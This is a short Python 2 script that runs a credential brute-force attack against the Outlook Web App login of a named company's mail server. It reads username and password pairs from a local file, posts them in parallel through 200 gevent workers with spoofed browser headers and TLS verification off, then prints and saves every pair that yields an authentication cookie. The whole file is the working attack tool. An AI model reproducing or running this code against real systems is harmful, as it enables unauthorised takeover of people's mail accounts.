from gevent import monkey
from gevent.pool import Pool
import requests
from lib.lib import *
def check(args):
	args = args.split("&password=")
	username = args[0].strip()
	password = args[1].strip()
	content = "destination=https%3A%2F%2Fmail.mucfc.com%2Fowa%2F&flags=4&forcedownlevel=0&username={0}&password={1}&passwordText=&isUtf8=1".format(username,password)
	headers = {"Host": "mail.mucfc.com",
	           "User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:35.0) Gecko/20100101 Firefox/35.0",
	           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	           "Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate",
	           "Referer": "https://mail.mucfc.com/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2fmail.fangdd.com%2fowa%2f",
	           "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "130"}
	count_try = 1
	while count_try <= 3:
		try:
			res = requests.post("https://mail.mucfc.com/owa/auth.owa", data=content, headers=headers, allow_redirects=False, timeout=20,verify=False)
			if 'cadatakey' in str(res.headers).lower():
				print "Found",username,password
				saveFile(username + " " + password, "temp/xxxxx")
			return "success"
		except Exception,e:
			count_try = count_try + 1
			print e
			pass
	return "fail"

res = open("/Users/4nim4l/python/burstmailmoni_xhqb/mucfc.txt", "r").readlines()
p = Pool(200)
p.map(check, res)

